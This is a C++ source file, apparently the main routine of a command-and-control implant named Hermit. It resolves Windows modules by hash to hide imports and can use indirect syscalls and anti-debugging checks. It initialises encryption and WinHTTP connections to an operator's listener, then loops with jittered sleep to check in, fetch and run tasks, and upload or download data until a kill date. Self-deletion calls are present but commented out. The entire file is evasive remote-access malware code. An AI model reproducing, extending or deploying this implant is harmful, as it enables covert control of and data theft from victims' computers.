#include "hermit.hpp"

namespace Hermit
{
	VOID Run(
		HINSTANCE       hInstance,
		INT 			nCmdShow,
		LPCWSTR			lpPayloadType,
		BOOL			bIndirectSyscalls,
		BOOL			bAntiDebug,
		LPCWSTR			lpProtocol,
		LPCWSTR 		lpHost,
		INTERNET_PORT 	nPort,
		LPCWSTR 		lpReqPathCheckIn,
		LPCWSTR			lpReqPathDownload,
		LPCWSTR 		lpReqPathTaskGet,
		LPCWSTR 		lpReqPathTaskResult,
		LPCWSTR			lpReqPathUpload,
		LPCWSTR			lpReqPathWebSocket,
		INT 			nSleep,
		INT				nJitter,
		INT				nKillDate,
		LPCWSTR 		lpKey,
		LPCWSTR 		lpIV
	) {
		State::PSTATE pState = new State::STATE;

		pState->pTeb = NtCurrentTeb();

		// --------------------------------------------------------------------------
		// Get module handlers and functions.
		// --------------------------------------------------------------------------

		HMODULE hNtdll = (HMODULE)Procs::GetModuleByHash(HASH_MODULE_NTDLL);
        if (!hNtdll)
        {
			return;
        }
		pState->hNTDLL = hNtdll;

		HMODULE hKernel32 = (HMODULE)Procs::GetModuleByHash(HASH_MODULE_KERNEL32);
		if (!hKernel32)
		{
			return;
		}
		pState->hKernel32DLL = hKernel32;

		// Get functions
		pState->pProcs = Procs::FindProcs(
			hNtdll,
			hKernel32,
			bIndirectSyscalls
		);

		// --------------------------------------------------------------------------
		// Get other module handlers functions.
		// --------------------------------------------------------------------------

		WCHAR wAdvapi32DLL[] = L"advapi32.dll";
		HMODULE hAdvapi32 = (HMODULE)Procs::LoadModule(pState->pProcs, (LPWSTR)wAdvapi32DLL);
		if (!hAdvapi32)
		{
			return;
		}
		pState->hAdvapi32DLL = hAdvapi32;

		WCHAR wBcryptDLL[] = L"bcrypt.dll";
		HMODULE hBcrypt = (HMODULE)Procs::LoadModule(pState->pProcs, (LPWSTR)wBcryptDLL);
		if (!hBcrypt)
		{
			return;
		}
		pState->hBcryptDLL = hBcrypt;

		WCHAR wCrypt32DLL[] = L"crypt32.dll";
		HMODULE hCrypt32 = (HMODULE)Procs::LoadModule(pState->pProcs, (LPWSTR)wCrypt32DLL);
		if (!hCrypt32)
		{
			return;
		}
		pState->hCrypt32DLL = hCrypt32;

		WCHAR wNetapi32DLL[] = L"netapi32.dll";
		HMODULE hNetapi32 = (HMODULE)Procs::LoadModule(pState->pProcs, (LPWSTR)wNetapi32DLL);
		if (!hNetapi32)
		{
			return;
		}
		pState->hNetapi32DLL = hNetapi32;

		WCHAR wWinHttpDll[] = L"winhttp.dll";
		HMODULE hWinHttp = (HMODULE)Procs::LoadModule(pState->pProcs, (LPWSTR)wWinHttpDll);
		if (!hWinHttp)
		{
			return;
		}
		pState->hWinHTTPDLL = hWinHttp;

		// Get functions
		Procs::FindProcsMisc(
			pState->pProcs,
			hAdvapi32,
			hBcrypt,
			hCrypt32,
			hNetapi32,
			hWinHttp
		);

		// --------------------------------------------------------------------------
		// Store states others.
		// --------------------------------------------------------------------------

		pState->pCrypt				= Crypt::InitCrypt(pState->pProcs, lpKey, lpIV);
		pState->hInstance 			= hInstance;
		pState->nCmdShow 			= nCmdShow;
		pState->lpPayloadType 		= lpPayloadType;
		pState->bIndirectSyscalls	= bIndirectSyscalls;
		pState->lpListenerProto 	= lpProtocol;
		pState->lpListenerHost 		= lpHost;
		pState->nListenerPort 		= nPort;
		pState->lpReqPathCheckIn 	= lpReqPathCheckIn;
		pState->lpReqPathTaskGet 	= lpReqPathTaskGet;
		pState->lpReqPathTaskResult = lpReqPathTaskResult;
		pState->lpReqPathDownload 	= lpReqPathDownload;
		pState->lpReqPathUpload 	= lpReqPathUpload;
		pState->lpReqPathWebSocket 	= lpReqPathWebSocket;
		pState->nSleep 				= nSleep;
		pState->nJitter 			= nJitter;
		pState->nKillDate 			= nKillDate;
		pState->hSession 			= NULL;
		pState->hConnect 			= NULL;
		pState->hRequest 			= NULL;
		// pState->pSocket 			= NULL;
		pState->bQuit 				= FALSE;

		// --------------------------------------------------------------------------
		// Anti-Debug
		// --------------------------------------------------------------------------

		// Anti-Debug
		if (bAntiDebug)
		{
			Technique::AntiDebug::StopIfDebug(pState->pProcs);
		}

		// --------------------------------------------------------------------------
		// Get initial info and http handlers.
		// --------------------------------------------------------------------------

		// Get system information
		std::wstring wInfoJson = Handler::GetInitialInfoJSON(pState);

		// Initialize WinHttp handlers
		Handler::HTTPInit(pState);
		if (pState->hSession == NULL || pState->hConnect == NULL)
		{
			// System::Fs::SelfDelete(pState->pProcs);
			State::Free(pState);
			return;
		}

		// WinHttpSetStatusCallback(hSession, WinHttpCallback, WINHTTP_CALLBACK_FLAG_SECURE_FAILURE, 0);

		// --------------------------------------------------------------------------
		// Check-in
		// --------------------------------------------------------------------------

		do
		{
			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);

			if (Handler::IsKillDateReached(pState->nKillDate))
			{
				pState->bQuit = TRUE;
			}

			if (Handler::CheckIn(pState, wInfoJson))
			{
				break;
			}
		} while (1 == 1);

		// --------------------------------------------------------------------------
		// Process tasks
		// --------------------------------------------------------------------------

		do
		{
			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);

			if (Handler::IsKillDateReached(pState->nKillDate))
			{
				pState->bQuit = TRUE;
			}

			Handler::Task(pState);

			// Manage socket connections
			// Handler::Socket(pState);
		} while (!pState->bQuit);

		// System::Fs::SelfDelete(pState->pProcs);
		State::Free(pState);
		return;
	}
}

